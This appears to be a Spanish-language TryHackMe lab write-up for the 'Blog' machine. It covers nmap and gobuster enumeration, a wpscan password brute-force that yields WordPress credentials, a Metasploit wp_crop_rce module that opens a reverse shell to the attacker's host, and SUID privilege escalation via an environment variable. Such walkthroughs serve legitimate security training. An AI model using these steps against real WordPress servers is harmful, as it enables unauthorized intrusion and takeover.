---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - WordPress
  - CMS
  - PrivilegeEscalation
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Wpscan|Wpscan]]
	- [[#Explotación#MSFconsole|MSFconsole]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#SUID|SUID]]

---
# Resolviendo la máquina Blog

>En esta publicación, comparto cómo resolví la máquina **Blog** de [TryHackMe](https://tryhackme.com/room/blog).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.213.30`

![[Pasted image 20250725121052.png]]
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.213.30 -oG allPorts`

![[Pasted image 20250725121224.png]]

`nmap -p22,80,139,445 -sCV 10.10.213.30 -oN targeted`

![[Pasted image 20250725121326.png]]
### HTTP

`http://10.10.213.30/`

![[Pasted image 20250725122455.png]]

![[Pasted image 20250725122541.png]]

Como no se visualiza correctamente, se añade una entrada en `/etc/hosts` para resolver el dominio.

`echo "10.10.213.30 blog.thm" >> /etc/hosts`

![[Pasted image 20250725122654.png]]

Ya se visualiza correctamente.
#### Fuzzing Web

`gobuster dir -u http://10.10.213.30/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250725124207.png]]

---
## Explotación
### Wpscan

`wpscan --url http://10.10.219.180/ --enumerate u,vp`

![[Pasted image 20250725173708.png]]
![[Pasted image 20250725173742.png]]

`wpscan --url http://10.10.219.180/ --passwords /usr/share/wordlists/rockyou.txt --usernames bjoel,kwheel`

![[Pasted image 20250725173826.png]]
![[Pasted image 20250725174144.png]]

Con las credenciales obtenidas (`kwheel` / `cutiepie1`), se accede al panel de WordPress.

![[Pasted image 20250725181855.png]]
### MSFconsole

En Metasploit (`msfconsole`) se busca un módulo compatible con la versión de WordPress detectada. Se encuentra el exploit (`exploit/multi/http/wp_crop_rce`) que permite ejecutar **RCE (Remote Code Execution)**.

```
search WordPress 5.0
use 0 | use exploit/multi/http/wp_crop_rce
set LHOST 10.8.184.124
set RHOSTS 10.10.219.180
set USERNAME kwheel
set PASSWORD cutiepie1
exploit
```

![[Pasted image 20250725182204.png]]

`shell`

`/bin/bash -i`
### Escalada de Privilegios
#### SUID

Se realiza una búsqueda de permisos **SUID**.

`find / -perm -4000 2>/dev/null`

![[Pasted image 20250725183415.png]]

`ltrace checkcer`

![[Pasted image 20250725183454.png]]

Con `ltrace`, se identifica que el binario `checker` busca la variable de entorno `admin`. Al definirla manualmente (`export admin=hello`), se logra ejecutar el binario con privilegios elevados.

`export admin=hello`

`checker`

![[Pasted image 20250725183534.png]]

Se accede al directorio: `/root`

`cd /root`

`ls`

![[Pasted image 20250725183615.png]]

Además de buscar la flag del usuario.

`find / -name user.txt 2>/dev/null`

![[Pasted image 20250725183649.png]]

---
